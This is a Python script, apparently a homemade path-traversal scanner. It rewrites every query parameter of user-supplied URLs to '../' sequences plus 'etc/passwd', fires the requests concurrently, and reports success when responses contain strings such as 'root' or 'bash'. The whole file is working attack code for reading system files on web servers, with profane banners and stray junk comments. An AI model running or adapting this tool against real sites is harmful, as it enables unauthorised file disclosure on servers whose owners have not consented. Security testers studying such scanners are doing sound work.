import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
from  urllib.parse import urlparse, parse_qs
import urllib
import sys

import urllib.parse
from urllib.parse import unquote
from  urllib.parse import urlparse, parse_qs
from  urllib.parse import urlencode
import sys
import logging
from termcolor import colored
import pyfiglet

from colorama import init
init(strip=not sys.stdout.isatty()) # strip colors if stdout is redirected
from termcolor import cprint 
from pyfiglet import figlet_format


from http.client import HTTPConnection  # py3
#############uncomment for debugging

#log = logging.getLogger('urllib3')
#log.setLevel(logging.DEBUG)
#ereerer
## logging from urllib3 to console
#ch = logging.StreamHandler()
#ch.setLevel(logging.DEBUG)
#log.addHandler(ch)
#счсчкукукукукекеммсмуеerereefdv
## print statements from `http.client.HTTPConnection` to console/stdout
#HTTPConnection.debuglevel = 1





##########################Draw the console graphic 
cprint(figlet_format('FUCK_PT', font='starwars'),
       'yellow', 'on_red', attrs=['bold'])
#print('Created by application security researcher N00mad')
result = pyfiglet.figlet_format("Created by application security researcher N00mad", font = "digital" )
print(result)
#with open('test.txt') as ff:
#    url_list = ff.read().splitlines()
#    print(url_list)



#sending request function
def send_request(url):
    html = requests.get(url, stream=True)
    return html.text


#importing path-traversal payloads 

read_payload = open("pt.txt", "r")

for slashes in read_payload: 

# read each url from file supplied by user

    def path_traversal():
        read_file = open("test.txt", "r")
    
    
    ##############starting multithread process 
    processes = []
    with ThreadPoolExecutor(max_workers=10) as executor:
        read_file = open("test.txt", "r")
        for url in read_file:
            query = urlparse(url).query
            params = parse_qs(query)
            #print(query)
            print('Original url:',url)
            #print(url)
            #print(params)
            for x in params:
                payload_etc='etc/passwd'
                ##handle each type of pyaload and mutations for payload
                ##payload_path1='../../../../../../../../'
                ##payload_path2='../../../../../../../'
                ##payload_path3='../../../../../../'
                ##payload_path4='../../../../../'
                ##payload_path5='../../../../'
                #payload_path6='../../../'
                #payload_path7='../../'
                #payload_path8='../'
    
                #print("xxxxxx",x)
                #w=params[x]='../../../etc/passwd'
                print("sssssssssssssssssssss",slashes)
                slashes=slashes.strip("\n")
                params[x]=slashes+payload_etc
                #print('params for PT',w1)
                #print('params for PT',w)
    
            query_string = urlencode(params)
    
            
    
    
            print('Query string for',query_string)
    
    
            #recreate url with pure url path
            new_url = url.split('?')[0]
    
    
            
    
    
            
            new_final_url=new_url +'?'+ urllib.parse.urlencode(params)
            print("ddddddddddddd",new_final_url)
            new_final_url1=unquote(new_final_url)

            #print('Final url:',new_url + urllib.parse.urlencode(params))
    
            print("Final url",new_final_url1)
            print('\n\n\n')
            
            processes.append(executor.submit(send_request, new_final_url1))
    
    
        #for url in url_list:
            
            
  
            
    
    for task in as_completed(processes):
        #rint(task.result())
    
    #####################handling response and look for PT/DT behaviour 
    #test_text="dfsdfsdf f sdf sdf df sdfsdfsdf root"
    
    
    ## looking for a trigger in response text 
    
        content=task.result()
        trigers=["bin","bash","daemon","sys","root"]
        for t in trigers:
            if t in content:
             print(colored("Path traversal, Mafaka!!!!!!",'red'))
             sys.exit('FOUND')
        
   




#print("===================",content)